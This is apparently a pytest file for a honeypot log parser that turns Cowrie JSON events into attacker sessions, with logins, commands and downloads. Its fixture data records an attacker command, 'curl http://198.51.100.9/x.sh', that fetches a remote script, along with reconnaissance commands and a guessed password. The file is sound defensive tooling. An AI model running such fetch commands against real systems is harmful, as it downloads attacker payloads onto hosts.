"""Tests for the cowrie.json parser.

The fixtures use addresses from the documentation ranges reserved by RFC 5737
(203.0.113.0/24, 198.51.100.0/24), so no real attacker address is committed.
"""

from datetime import UTC, datetime
from pathlib import Path

from honeypot_ai.ingest import ParseStats, build_sessions, iter_events, parse_file
from honeypot_ai.models import Protocol

FIXTURES = Path(__file__).parent / "fixtures"
SAMPLE = FIXTURES / "cowrie-sample.json"
BROKEN = FIXTURES / "cowrie-broken.json"


def test_sample_file_yields_three_sessions_in_start_order() -> None:
    sessions, stats = parse_file(SAMPLE)

    assert [s.session_id for s in sessions] == ["cbc68adb9eb9", "4d811ea9aba6", "telnet0001"]
    assert stats.events == 15
    assert stats.skipped == 0


def test_interactive_session_is_fully_assembled() -> None:
    sessions, _ = parse_file(SAMPLE)
    session = next(s for s in sessions if s.session_id == "4d811ea9aba6")

    assert session.src_ip == "203.0.113.51"
    assert session.src_port == 13020
    assert session.protocol is Protocol.SSH
    assert session.client_version == "SSH-2.0-Go"
    assert session.sensor == "sensor-01"

    assert len(session.login_attempts) == 2
    assert session.authenticated
    assert session.login_attempts[-1].password == "passwort.112233"

    assert [c.input for c in session.commands] == [
        "uname -a",
        "curl http://198.51.100.9/x.sh",
    ]
    assert session.commands[0].failed is False
    assert session.commands[1].failed is True

    assert len(session.file_transfers) == 1
    assert session.file_transfers[0].url == "http://198.51.100.9/x.sh"
    assert session.file_transfers[0].uploaded is False

    assert session.duration_seconds == 4.6
    assert session.ended_at == datetime(2026, 9, 30, 21, 33, 36, 978414, tzinfo=UTC)


def test_brute_force_session_has_no_commands() -> None:
    sessions, _ = parse_file(SAMPLE)
    session = next(s for s in sessions if s.session_id == "cbc68adb9eb9")

    assert len(session.login_attempts) == 2
    assert not session.authenticated
    assert not session.interactive


def test_unknown_event_types_do_not_break_the_session() -> None:
    """Cowrie gains event types between releases; one must not lose the rest."""
    sessions, stats = parse_file(SAMPLE)
    session = next(s for s in sessions if s.session_id == "telnet0001")

    assert session.protocol is Protocol.TELNET
    assert session.authenticated
    assert stats.invalid == 0


def test_session_left_open_still_produces_a_session() -> None:
    """Connections drop mid-flight; a truncated session is still evidence."""
    sessions, _ = parse_file(SAMPLE)
    session = next(s for s in sessions if s.session_id == "telnet0001")

    # No closed event: the end is inferred from the last event seen.
    assert session.ended_at == datetime(2026, 9, 30, 21, 35, 11, tzinfo=UTC)
    assert session.duration_seconds == 1.0


def test_malformed_lines_are_counted_and_skipped() -> None:
    sessions, stats = parse_file(BROKEN)

    assert len(sessions) == 1
    assert sessions[0].session_id == "ok01"
    assert stats.events == 2
    assert stats.malformed == 3  # truncated JSON, plain text, a bare list
    assert stats.invalid == 2  # missing session, empty eventid
    assert stats.skipped == 5


def test_blank_lines_are_ignored_entirely() -> None:
    stats = ParseStats()
    events = list(iter_events(["", "   ", "\n"], stats))

    assert events == []
    assert stats.lines == 0


def test_events_are_grouped_by_session_not_by_address() -> None:
    """One address opens many connections; each is its own story."""
    lines = [
        '{"eventid":"cowrie.session.connect","timestamp":"2026-09-30T10:00:00Z",'
        '"session":"a","src_ip":"203.0.113.1"}',
        '{"eventid":"cowrie.session.connect","timestamp":"2026-09-30T10:00:01Z",'
        '"session":"b","src_ip":"203.0.113.1"}',
    ]
    sessions = build_sessions(iter_events(lines))

    assert len(sessions) == 2
    assert {s.src_ip for s in sessions} == {"203.0.113.1"}


def test_out_of_order_events_still_bound_the_session() -> None:
    """Nothing guarantees the log is ordered; the earliest event wins."""
    lines = [
        '{"eventid":"cowrie.command.input","timestamp":"2026-09-30T10:00:05Z",'
        '"session":"z","src_ip":"203.0.113.2","input":"id"}',
        '{"eventid":"cowrie.session.connect","timestamp":"2026-09-30T10:00:00Z",'
        '"session":"z","src_ip":"203.0.113.2","protocol":"ssh"}',
    ]
    sessions = build_sessions(iter_events(lines))

    assert len(sessions) == 1
    assert sessions[0].started_at == datetime(2026, 9, 30, 10, 0, 0, tzinfo=UTC)
    assert sessions[0].protocol is Protocol.SSH
